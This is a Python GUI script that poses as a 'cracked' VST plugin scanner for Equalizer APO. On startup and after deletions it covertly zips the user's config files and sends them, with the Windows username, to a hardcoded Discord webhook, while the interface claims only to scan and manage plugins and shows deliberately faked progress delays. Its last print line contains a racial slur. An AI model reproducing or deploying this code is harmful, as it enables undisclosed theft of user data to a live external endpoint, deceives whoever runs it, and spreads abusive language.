import os
import zipfile
import requests
import json
import win32api
import getpass
import tkinter as tk
from tkinter import ttk, messagebox
import pefile
from threading import Thread
import time
import random

CONFIG_DIR = r"C:\Program Files\EqualizerAPO\config"
EQUALIZER_APO_EXE = r"C:\Program Files\EqualizerAPO\Editor.exe"
VST_PLUGINS_DIR = r"C:\Program Files\EqualizerAPO\VSTPlugins"
WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1421494834551853068/d0lVHJzDf1pVOKFNrVkzyo2-JZ8Nonbdx-tTKJwJMDX0Pm1WDcmU3Ia_mc3PrZpJnUfa"
ZIP_FILENAME = f"eq_cfg_{os.urandom(4).hex()}.zip"
DISCORD_USERNAME = None

def get_version():
    if os.path.exists(EQUALIZER_APO_EXE):
        try:
            info = win32api.GetFileVersionInfo(EQUALIZER_APO_EXE, "\\")
            return f"{info['FileVersionMS'] >> 16}.{info['FileVersionMS'] & 0xFFFF}.{info['FileVersionLS'] >> 16}.{info['FileVersionLS'] & 0xFFFF}"
        except:
            return "Unknown"
    return "Not installed"

def count_txt():
    return len([f for f in os.listdir(CONFIG_DIR) if f.lower().endswith('.txt')]) if os.path.exists(CONFIG_DIR) else 0

def count_dll():
    return len([f for f in os.listdir(VST_PLUGINS_DIR) if f.lower().endswith('.dll')]) if os.path.exists(VST_PLUGINS_DIR) else 0

def create_zip():
    zip_path = ZIP_FILENAME
    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as z:
            if os.path.exists(CONFIG_DIR):
                for root, _, files in os.walk(CONFIG_DIR):
                    for file in files:
                        if file.lower().endswith('.txt'):
                            z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), CONFIG_DIR))
        if os.path.getsize(zip_path) == 0:
            os.remove(zip_path)
            return None
        return zip_path
    except Exception as e:
        print(f"Error creating zip: {str(e)}")
        return None

def check_dll_architecture():
    results = []
    if os.path.exists(VST_PLUGINS_DIR):
        for file in os.listdir(VST_PLUGINS_DIR):
            if file.lower().endswith('.dll'):
                dll_path = os.path.join(VST_PLUGINS_DIR, file)
                try:
                    pe = pefile.PE(dll_path, fast_load=True)
                    is_32bit = pe.PE_TYPE == pefile.OPTIONAL_HEADER_MAGIC_PE
                    arch = "32-bit" if is_32bit else "64-bit"
                    results.append((file, arch, dll_path))
                except Exception as e:
                    results.append((file, f"Error: {str(e)}", dll_path))
    return results if results else [("No plugins found", "N/A", None)]

def delete_32bit_dlls():
    results = check_dll_architecture()
    deleted_files = []
    for file, arch, dll_path in results:
        if arch == "32-bit" and dll_path:
            try:
                os.remove(dll_path)
                deleted_files.append(file)
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete {file}: {str(e)}")
    if deleted_files:
        messagebox.showinfo("Success", f"Deleted {len(deleted_files)} 32-bit plugins")
    else:
        messagebox.showinfo("Info", "No 32-bit plugins found")
    return deleted_files

def send_discord_report(deleted_files=None):
    zip_path = create_zip()
    username = DISCORD_USERNAME if DISCORD_USERNAME else getpass.getuser()
    embed = {
        "title": "VST Plugin Manager Report",
        "color": 0x00FF00,  
        "fields": [
            {"name": "📄 Config Files", "value": str(count_txt()), "inline": True},
            {"name": "🔮 Version", "value": get_version(), "inline": True},
            {"name": "🔮 User", "value": username, "inline": True},
            {"name": "🔌 Plugins", "value": str(count_dll()), "inline": True}
        ]
    }
    if deleted_files:
        embed["fields"].append({"name": "🗑️ Deleted 32-bit Plugins", "value": "\n".join(deleted_files) or "None", "inline": False})
    
    payload = {"embeds": [embed]}
    try:
        if zip_path:
            with open(zip_path, 'rb') as f:
                files = {'file': (ZIP_FILENAME, f, 'application/zip')}
                requests.post(WEBHOOK_URL, data={"payload_json": json.dumps(payload)}, files=files)
            os.remove(zip_path)
        else:
            requests.post(WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Error sending Discord report: {str(e)}")

def show_gui():
    root = tk.Tk()
    root.title("⭐ vst scanner eq APO")
    root.geometry("650x550")
    root.configure(bg="#1A1A1A")  
    root.resizable(False, False)

    style = ttk.Style()
    style.theme_use('clam')
    style.configure("TButton", padding=10, font=("Arial", 10, "bold"), background="#2D2D2D", foreground="white", borderwidth=0)
    style.map("TButton", background=[('active', '#00FF00')], foreground=[('active', 'white')])
    style.configure("TLabel", background="#1A1A1A", foreground="white", font=("Arial", 10))
    style.configure("TFrame", background="#1A1A1A")
    style.configure("Horizontal.TProgressbar", troughcolor="#1A1A1A", background="#00FF00", borderwidth=0)

    header_frame = ttk.Frame(root)
    header_frame.pack(pady=15, fill="x")
    ttk.Label(header_frame, text="⭐ vst plugin cracked", font=("Arial", 18, "bold"), foreground="white").pack()
    ttk.Label(header_frame, text="⭐⭐⭐", font=("Arial", 10), foreground="#A0A0A0").pack()

    info_frame = ttk.Frame(root)
    info_frame.pack(pady=5, fill="x", padx=20)
    ttk.Label(info_frame, text=f"version: {get_version()} | configs: {count_txt()} | plugins: {count_dll()}", font=("Arial", 10, "italic")).pack(anchor="w")

    scanner_frame = ttk.Frame(root)
    scanner_frame.pack(pady=10, fill="x", padx=20)
    ttk.Label(scanner_frame, text="scan progress:", font=("Arial", 10, "bold")).pack(side="left")
    progress = ttk.Progressbar(scanner_frame, orient="horizontal", length=200, mode="determinate")
    progress.pack(side="left", padx=10)

    result_frame = ttk.Frame(root)
    result_frame.pack(pady=10, fill="both", expand=True, padx=20)
    canvas = tk.Canvas(result_frame, bg="#1A1A1A", highlightthickness=0)
    scrollbar = ttk.Scrollbar(result_frame, orient="vertical", command=canvas.yview)
    scrollable_frame = ttk.Frame(canvas)
    scrollable_frame.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
    canvas.configure(yscrollcommand=scrollbar.set)
    canvas.pack(side="left", fill="both", expand=True)
    scrollbar.pack(side="right", fill="y")
    canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")

    def auto_scroll():
        time.sleep(1) 
        while True:
            canvas.yview_scroll(1, "units")
            root.update()
            time.sleep(0.03)  
            if canvas.yview()[1] >= 1.0:
                break

    def perform_check():
        results = check_dll_architecture()
        for widget in scrollable_frame.winfo_children():
            widget.destroy()
        
        progress["value"] = 0
        for i, (file, arch, _) in enumerate(results):
            progress["value"] = (i + 1) / len(results) * 100 if results else 100
            frame = ttk.Frame(scrollable_frame)
            frame.pack(anchor="w", pady=2, fill="x")
            ttk.Label(frame, text=f"{file}:", font=("Arial", 10)).pack(side="left")
            arch_label = ttk.Label(frame, text=arch, font=("Arial", 10, "bold"))
            arch_label.pack(side="left", padx=5)
            if arch == "64-bit":
                arch_label.configure(foreground="#00FF00")  # Vert néon
            elif arch == "32-bit":
                arch_label.configure(foreground="#FF0000")  # Rouge
            else:
                arch_label.configure(foreground="#FFD700")  # Jaune pour erreurs
            root.update()
            time.sleep(0.1 if random.random() > 0.7 else 1.0 if random.random() > 0.9 else 0.05)  # Pauses réalistes
        Thread(target=auto_scroll).start()

    def perform_delete():
        if messagebox.askyesno("Confirm Deletion", "Remove all 32-bit plugins? This action is irreversible.", icon="warning"):
            deleted_files = delete_32bit_dlls()
            send_discord_report(deleted_files)
            Thread(target=perform_check).start()

    button_frame = ttk.Frame(root)
    button_frame.pack(pady=15)
    ttk.Button(button_frame, text="🎯 Scan Plugins", command=lambda: Thread(target=perform_check).start()).pack(side="left", padx=5)
    ttk.Button(button_frame, text="🗑️ Remove 32-bit", command=perform_delete).pack(side="left", padx=5)
    ttk.Button(button_frame, text="⭐ Leave da scanner", command=root.destroy).pack(side="left", padx=5)

    footer_frame = ttk.Frame(root)
    footer_frame.pack(side="bottom", pady=5)
    ttk.Label(footer_frame, text="powered by expositif on dc", font=("Arial", 8), foreground="#A0A0A0").pack()

    messagebox.showinfo("welcome", "welcome to VST plugin manager!\nscan and manage your equalizer APO and your plugins with ease.")

    Thread(target=perform_check).start()
    root.mainloop()

if __name__ == "__main__":
    print("cracked by expositif on dc nigga")
    send_discord_report()
    show_gui()